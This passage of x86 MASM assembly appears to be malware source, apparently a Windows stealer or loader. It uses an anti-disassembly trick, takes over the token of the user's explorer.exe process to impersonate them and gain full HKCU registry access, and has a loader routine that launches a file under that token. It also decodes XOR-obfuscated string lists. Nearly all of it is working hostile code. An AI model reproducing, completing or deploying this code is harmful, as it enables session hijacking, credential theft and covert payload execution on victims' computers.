	LOCAL   Process: PROCESSENTRY32
    LOCAL   hSnapshot: DWORD
    LOCAL	dwExplorerSessId: DWORD
    LOCAL	hProfile: DWORD

    AntiDisasmTrick

    .IF	!MyWTSGetActiveConsoleSessionId || !MyProcessIdToSessionId || !MyOpenProcessToken || !MyImpersonateLoggedOnUser
    	sub	eax, eax
    	ret
    .ENDIF

    sub	ebx, ebx

	call	MyWTSGetActiveConsoleSessionId
	mov	dwActiveConsoleSessId, eax

	mov     Process.dwSize, sizeof PROCESSENTRY32
    invoke  CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, 0
    .IF	eax != INVALID_HANDLE_VALUE
		mov     hSnapshot, eax

        invoke  Process32First, hSnapshot, addr Process
	@@:
        .IF	eax
			invoke  StrStrI, addr Process.szExeFile, offset szExplorerProcessName
			.IF     eax
               	mov	dwExplorerSessId, 0
               	lea	eax, dwExplorerSessId
               	push	eax
               	push	Process.th32ProcessID
               	call	MyProcessIdToSessionId
               	mov	edx, dwExplorerSessId
               	.IF	eax && edx == dwActiveConsoleSessId
					invoke	OpenProcess, MAXIMUM_ALLOWED, FALSE, Process.th32ProcessID
					.IF	eax
						mov	hProcess, eax
						lea	eax, hToken
						push	eax
						push	TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY or TOKEN_DUPLICATE or TOKEN_ASSIGN_PRIMARY or TOKEN_ADJUST_SESSIONID or TOKEN_READ or TOKEN_WRITE
						push	hProcess
						call	MyOpenProcessToken
						.IF	eax
							; Impersonate
							push	hToken
							call	MyImpersonateLoggedOnUser
							.IF	eax
								inc	ebx

								; Get HKCU handle pointer
								mov	hProfile, 0
								invoke	RegOpenCurrentUser, KEY_ALL_ACCESS, addr hProfile
								.IF	eax == ERROR_SUCCESS && hProfile
									m2m	dwCurrentUserKey, hProfile
								.ENDIF

								mov	eax, lpUserToken
								.IF	eax
									m2m	dword ptr[eax], hToken
								.ENDIF

								jmp	@close_snapshot
							.ELSE
								invoke	CloseHandle, hToken
								invoke	CloseHandle, hProcess
							.ENDIF
						.ELSE
							invoke	CloseHandle, hProcess
						.ENDIF
					.ENDIF
               	.ENDIF
               .ENDIF
			invoke  Process32Next, hSnapshot, addr Process
			jmp     @B
		.ENDIF

	@close_snapshot:
        invoke  CloseHandle, hSnapshot
	.ENDIF

	mov	eax, ebx
	ret
ImpersonateLocalSystemUser endp

IFDEF ENABLE_LOADER

ExecuteFile proc lpFilePath, hUserToken
	LOCAL	_si: STARTUPINFO
	LOCAL	_pi: PROCESS_INFORMATION
	LOCAL	env_block: DWORD

	.IF	!lpFilePath
		sub	eax, eax
		ret
	.ENDIF

	; Execute file
	.IF	hUserToken && MyCreateEnvironmentBlock && MyCreateProcessAsUser && MyDestroyEnvironmentBlock
		; Execute file under elevated privileges
		invoke	ZeroMemory, addr _si, sizeof _si
		invoke	ZeroMemory, addr _pi, sizeof _pi
		mov	_si.cb, sizeof _si

		mov	env_block, NULL
		push	FALSE
		push	hUserToken
		lea	eax, env_block
		push	eax
		call	MyCreateEnvironmentBlock
		.IF	eax
			lea	eax, _pi
			push	eax ; process information
			lea	eax, _si
			push	eax ; startup information
			push	0 ; current directory
			push	env_block ; environment
			push	CREATE_UNICODE_ENVIRONMENT ; flags: use elevated environment block
			push	FALSE ; do not inherit handles
			push	0 ; thread attributes
			push	0 ; process attributes
			push	0 ; command line
			push	lpFilePath ; application name
			push	hUserToken
			call	MyCreateProcessAsUser
			push	eax
			push	env_block
			call	MyDestroyEnvironmentBlock
			pop	eax
			.IF	!eax
				; something went wrong, try usual ShellExecute code
				jmp	@do_usual_execute
			.ENDIF
		.ELSE
			jmp	@do_usual_execute
		.ENDIF
	.ELSE
		; Usual execution under normal privileges
	@do_usual_execute:
		push    SW_SHOWDEFAULT
		push    0
		push    0
		push    lpFilePath
		push    offset szTextOpen
		push    0
		call    ShellExecute
	.ENDIF
	ret
ExecuteFile endp

ENDIF

DecipherList proc uses edi list_offset
	mov	edi, list_offset
	.WHILE byte ptr[edi]
		.WHILE byte ptr[edi]
			xor	byte ptr[edi], 1
			inc	edi
		.ENDW
		inc	edi
	.ENDW
	ret
DecipherList endp
